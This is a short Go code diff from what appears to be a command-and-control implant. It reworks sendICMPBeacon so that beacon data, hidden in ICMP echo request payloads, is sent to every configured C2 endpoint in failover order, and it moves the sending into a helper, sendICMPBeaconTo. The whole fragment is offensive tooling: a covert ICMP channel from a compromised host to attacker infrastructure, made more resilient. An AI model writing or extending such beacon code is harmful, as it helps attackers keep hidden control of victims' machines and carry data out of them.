@@ -14,16 +14,17 @@ import (
 
 // sendICMPBeacon sends beacon data inside ICMP echo request payload to the C2 server.
 // Requires CAP_NET_RAW on Linux. Large v2 envelopes are fragmented (FC2I).
+// Every configured icmp:// endpoint is tried in failover order.
 func sendICMPBeacon(body []byte) []byte {
 	if C2URL == "" {
 		return nil
 	}
-	hostPort, _, ok := currentC2Dial()
-	if !ok {
-		return nil
-	}
-	host := hostnameFromHostPort(hostPort)
+	return forEachC2Endpoint("icmp", func(_ int, _ string, hostPort, _ string) []byte {
+		return sendICMPBeaconTo(hostnameFromHostPort(hostPort), body)
+	})
+}
 
+func sendICMPBeaconTo(host string, body []byte) []byte {
 	raddr, err := net.ResolveIPAddr("ip4", host)
 	if err != nil {
 		debugLog("ICMP resolve: " + err.Error())
